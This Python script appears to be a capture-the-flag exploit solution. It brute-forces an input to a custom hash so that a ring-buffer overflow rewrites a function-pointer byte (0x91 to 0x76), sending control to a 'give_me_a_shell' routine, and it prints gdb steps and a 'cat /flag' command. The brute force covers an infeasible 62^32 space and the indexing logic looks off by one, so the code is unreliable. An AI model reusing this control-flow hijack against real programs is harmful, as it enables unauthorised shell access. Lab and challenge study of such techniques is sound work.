global_ring_buffer_size = 32


def init():
    global_ring_buffer = [0x0] * global_ring_buffer_size
    global_ring_buffer.append(global_ring_buffer_initial_suffix)
    return global_ring_buffer


def my_awesome_hash(s, n):
    hash = 0x9980C25E1B3501DA

    global_ring_buffer = init()

    for i in range(0, n):
        hash ^= ord(s[i])
        hash = (hash << 9) ^ (hash >> 5)
        hash += 17
        hash ^= 0xDEADBEEFC0DEBABE

        hash &= 0xFFFFFFFFFFFFFFFF

        temp = []
        for k in range(len(hex(hash)), 0, -2):
            temp.append(hex(hash)[k - 2 : k])

        for j in range(0, 8):
            pos = j + i
            if pos > global_ring_buffer_size:
                pos = 0

            global_ring_buffer[pos] = temp[j]

    return global_ring_buffer


import string

letters = string.ascii_letters + string.digits
letters_len = len(letters)


def get_string(num, length):
    s = ""
    while len(s) < length:
        s += letters[num % letters_len]
        num = num // letters_len

    s = s[::-1]
    return s


def get_solution(length, replace_text):
    possibilities = letters_len**length
    s = ""
    for num in range(0, possibilities):
        s = get_string(num, length)
        global_ring_buffer = my_awesome_hash(s, len(s))
        if global_ring_buffer[global_ring_buffer_size] == replace_text:
            return s


# Open one terminal
print("gdb /challenge/run")
print("break main")
print("run a")

print("p &my_exit")
# (void (*)()) 0x401191 <my_exit>

print("p &give_me_a_shell")
# (void (*)()) 0x401176 <give_me_a_shell>

# Need to replace 91 with 76 to spawn shell
global_ring_buffer_initial_suffix = 0x91
global_ring_buffer_hash_target_suffix = "76"
print(
    "/challenge/run",
    get_solution(global_ring_buffer_size, global_ring_buffer_hash_target_suffix),
)
print("cat /flag")
